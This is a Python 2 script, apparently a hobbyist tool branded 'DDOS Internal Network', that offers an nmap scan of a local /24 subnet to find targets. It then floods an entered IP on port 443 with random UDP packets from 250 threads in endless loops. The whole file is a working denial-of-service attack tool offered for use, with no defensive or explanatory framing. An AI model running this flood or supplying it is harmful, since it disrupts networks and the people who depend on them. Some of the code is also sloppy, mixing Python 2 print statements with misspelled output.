import os
import sys
import socket
import threading
import random
import time
import datetime
class colors:
  W  = '\033[0m'  # white (default)
  R  = '\033[31m' # red
  G  = '\033[1;32m' # green bold
  O  = '\033[33m' # orange
  B  = '\033[34m' # blue
  P  = '\033[35m' # purple
  C  = '\033[36m' # cyan
  GR = '\033[37m' # gray
  cyanClaro="\033[1;36m"
  vermelho = '\033[31;1m'
  verde = '\033[32;1m'
  azul = '\033[34;1m'
  amarelo= '\033[1;33m'

def Animation(String):
    animation = "|/-\\"
    for i in range(15):
        time.sleep(0.1)
        sys.stdout.write("\r" + "[" + animation[i % len(animation)] + "]" + colors.G + String)
        sys.stdout.flush()
    print('')
def fastprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush() # defeat buffering
        time.sleep(1./50)

class Ghost_Lab:
    Banner = """

   ***
  ** **
 **   **
 **   **         ****
 **   **       **   ****
 **  **       *   **   **
  **  *      *  **  ***  **
   **  *    *  **     **  *       [+] DDOS Internal Network
    ** **  ** **        **
    **   **  **               *********************************
   *           *              *        fb.com/bossy.078       *
  *             *             *********************************
 *    0     0    *            *      Coded By : BOSSY         *
 *   /   @   \   *            *    Telegram : @bossy.078      * 
 *   \__/ \__/   *            *                               *
   *     W     *              *********************************
     **     **                *      github.com/bossy0        *
       *****                  *********************************"""
    Fast_Ban = """**************************************
* Denial of Internal Network Service * 
**************************************"""
    Status_Banner = """
+========================+
|         Status         |
+========================+"""
    End_Status = """+========================+"""

print(colors.azul+Ghost_Lab.Banner)
fastprint(colors.O+'\t\t\t\t Instagram :'+colors.P+' @bossy.078')
print(colors.GR + Ghost_Lab.Fast_Ban)
class attack(threading.Thread):
    def __init__(self, ip, port, size):
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.size = size
    def run(self):
      try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(self.size)
        while True:
            s.sendto(bytes,(self.ip, self.port))
            print colors.vermelho + " [*] Packet Send :" + " "+colors.verde + self.ip
      except KeyboardInterrupt:
        print('')
        print(colors.R+ "[!] Exiting...")
try:
  print('')
  Targets = raw_input("Do You See Possibles Targets ? n / Y > ")
  if Targets == 'Y' or Targets == 'y':
      print('')
      Animation(' Starting NMAP to SCAM...')
      os.system("nmap 192.168.0.1/24")
  else:
      pass
  print('')    
  ip = raw_input(colors.cyanClaro + "[*] Ip Internal Network >> ")
  print('')
  pckt = raw_input(colors.amarelo + "[*] Packets Size >> ")
  print('')
  port = 443
  Animation(' Starting Atack Dooser IP Packets...')
  print('')
  print(Ghost_Lab.Status_Banner)
  print(' IP : {}'.format(ip))
  print(' Port : {}'.format(port))
  print(' Dooser Packets : {}'.format(pckt))
  print(Ghost_Lab.End_Status)
  time.sleep(2)
  print('')
  threads = 250
  for host in range(int(threads)):
      BlackRabitt = attack(ip, int(port), int(pckt))
      BlackRabitt.start()
  Animation(' Atack Sussefull...')
  input('Press Any Key to Exit..')
  sys.exit(1)
except KeyboardInterrupt:
  fastprint(colors.vermelho + '[*] Exiting..')
  sys.exit(1)
